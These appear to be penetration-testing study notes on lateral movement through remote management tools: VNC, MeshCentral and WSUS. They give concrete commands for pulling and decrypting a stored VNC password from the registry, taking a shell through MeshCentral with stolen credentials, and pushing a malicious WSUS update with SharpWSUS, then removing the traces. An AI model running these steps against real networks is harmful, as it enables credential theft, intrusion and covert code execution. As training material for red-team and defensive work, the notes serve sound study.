Remote management tools like AnyDesk, TeamViewer, and VNC are widely used by organizations to provide remote support, access, and administration of systems. They can also be leveraged for lateral movement during penetration testing or by malicious actors.

### AnyDesk & TeamViewer

- Legitimate software used for remote desktop access.
    
- Allows **remote control**, **file transfers**, and **session persistence**.
    
- **Used by attackers** post-compromise to:
    - Maintain access (Command & Control)
    - Move laterally between systems
    - Blend in with legitimate traffic (low detection)
**Real-World Examples:**

- **Cobalt Group** abused **AnyDesk**
- **Carbanak Group** used **TeamViewer** to control victim systems

---

### **VNC (Virtual Network Computing)**

- Uses **Remote Frame Buffer (RFB)** protocol.
- Sends **keyboard/mouse input** to the remote machine and receives **screen updates**.
- TightVNC is a common lightweight implementation.
- **Default port:** `5900`

---

### ‚öîÔ∏è **VNC for Lateral Movement (MITRE ATT&CK T1021.005)**

#### üìå From Windows:

1. **Scan target for VNC port:**
    ```powershell
    Test-NetConnection -ComputerName SRV02 -Port 5900
    ```

2. **Retrieve saved VNC password from the registry:**

    ```
    powershell  reg query HKLM\SOFTWARE\TightVNC\Server /s
    ```

3. **Decrypt the password** using tools like:
    
    ```bash
    echo -n 816ECB5CE758EAAA | xxd -r -p | openssl enc -des-cbc --nopad --nosalt -K e84ad660c4721ae0 -iv 0000000000000000 -d | hexdump -Cv
    ```

    ‚Üí Result: `VNCFake1`
4. **Use VNC Viewer to connect** to the target:
    
    - Enter IP (e.g., `172.20.0.52`)
    - Use password (`VNCFake1`)
5. **Once connected**, you can:
    
    - Interact with the desktop
    - Execute commands
    - Transfer files (if enabled)

#### üìå From Linux:

1. **Install VNC viewer** (e.g., `xtightvncviewer`)
2. **Connect using autopass:**
    ```bash
    echo "VNCFake1" | vncviewer -autopass 172.20.0.52
    ```


## What Are Software Deployment & Remote Management Tools?

These are tools used by IT teams to:
- Deploy software
- Manage patches
- Remotely control systems
- Monitor performance
- Enforce configurations

### Common Tools Include:

- Microsoft Intune
    
- SCCM (System Center Configuration Manager)
    
- PDQ Deploy
- **MeshCentral**
- ManageEngine Desktop Central
- SolarWinds
- Kaseya VSA
- Ivanti
---

## ‚ö†Ô∏è Why These Tools Are High-Value Targets

If an attacker compromises a **privileged account** (e.g., an IT admin), they can:

- Log into these tools
- Push malicious software to all connected devices
- Remotely access terminals
- Escalate privileges
- Create **persistent backdoors** across the network

## üí° Case Study: **MeshCentral**

**MeshCentral** is an open-source remote management tool. It:

- Uses **agent-based architecture** (an agent is installed on each managed device)
- Agents communicate with the Mesh server over **port 443** (like HTTPS)
- Provides remote desktop, terminal access, file transfer, and monitoring features

### üîé Step-by-Step Attack Scenario

#### ‚úÖ 1. **Enumerate MeshCentral on the Network**

Check for port `443` and web services:

`nmap -p443 10.129.229.243 -sC -sV`

`http-title: MeshCentral - Login`

This confirms MeshCentral is present.

#### ‚úÖ 2. **Login With Compromised Credentials**

Suppose attacker has:

- Username: `admin`
- Password: `RemoteManagement01`
They log in via the MeshCentral web interface.

#### ‚úÖ 3. **Select a Target Device**

Navigate to **‚ÄúMy Devices‚Äù**, choose a device (e.g., `SRV02`), and access the **Terminal tab**.

#### ‚úÖ 4. **Establish a Remote Shell**

By clicking **‚ÄúConnect‚Äù** under Terminal:

- You get a live shell on the target
- Can execute arbitrary commands
- No need for SMB, RDP, or open inbound ports ‚Äî the agent maintains an outbound connection to the MeshCentral server (often overlooked in firewalls)

### Windows Server Update Services (WSUS)
It is a Microsoft service that allows administrators to distribute updates and patches for Microsoft products throughout an environment in a scalable way. This solution enables internal servers to receive updates without direct internet access. WSUS is widely used in Windows corporate networks.

Access to the WSUS service requires administrative privileges on the server where the service is installed, meaning we need a user who is a member of either the Administrator Group or the WSUS Administrator Group . To effectively use WSUS WSUS service for lateral movement, the WSUS Server must be configured on the target server to accept updates

The attacker:

1. **Finds the WSUS server** and verifies WSUS is active (via registry or tools like SharpWSUS)
2. **Gains access to WSUS server** (via compromised credentials)
3. **Creates a malicious update** (e.g., with PSExec or similar payload)
4. **Approves it for a target machine**
5. **Waits for or forces the client to install the update**
6. **Achieves remote code execution**
7. **Cleans up** to remove traces

### WSUS  Enumeration:
We must identify if the WSUS Server, to get this information we can query the registry `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate`key
- We can use `SharpWSUS.exe locate`  to identify the wsus server
- Once we have access to an account with rights on the Administrators or WSUS server , either a member of the WSUS Administrators , our task is to create a patch that will give us command execution on the target machine.

### üîç Key Techniques:

- **Registry Enumeration** to find WSUS server address
    
- **Patch Injection** using valid-signed binaries (Microsoft requirement)
    
- **Manual or Scripted Approval** of updates via GUI or CLI
    
- **Targeting Specific Computers** or groups in the WSUS configuration
    

---

## üí• **Execution Breakdown**

### 1. **Enumerate WSUS Server**


`reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer`


`SharpWSUS.exe locate`

### 2. **Inspect WSUS Server**

To list all managed computers, check-in status, and groups:

`SharpWSUS.exe inspect`

### 3. **Create a Malicious Update**

Inject payload:

`SharpWSUS.exe create /title:NewAccountUpdate /path:PSExec64.exe`

### 4. Approve the Update

`SharpWSUS.exe approve /updateid:<ID> /computername:<target> /groupname:"FastUpdates"`

If this fails, approve manually via WSUS GUI.

### 5. **Fix Download Errors**

If `Event ID 364` shows a 404 error:

- Check Event Viewer for destination path
    
- Manually copy the payload to `WSUSContent` path:


`copy C:\Tools\sysinternals\PSExec64.exe C:\WSUS\WsusContent\xx\<filename>.exe`

Then retry download in WSUS GUI.

### 6. **Check if Target Installed the Update**


`SharpWSUS.exe check /updateid:<ID> /computername:<target>`

### 7. **Cleanup**

`SharpWSUS.exe delete /updateid:<ID> /computername:<target>`

### Alternative
- WSUSpendu
- Thunder_Woosus